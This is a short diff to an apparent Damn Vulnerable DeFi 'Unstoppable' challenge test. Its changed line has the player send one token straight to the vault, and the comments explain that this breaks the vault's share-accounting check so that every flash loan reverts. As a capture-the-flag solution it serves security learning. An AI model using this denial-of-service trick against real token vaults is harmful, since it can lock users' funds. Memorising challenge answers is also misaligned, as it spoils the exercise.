@@ -49,7 +49,7 @@ describe('[Challenge] Unstoppable', function () {
         // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
         // If we beak the equality between totalSupply and balanceBefore sending 1 extra token to the vault
         // We're going to make the contract to be reverted every time it's called.
-        await token.transfer(vault.address, 1);
+        await token.connect(player).transfer(vault.address, 1);
 
     });
 
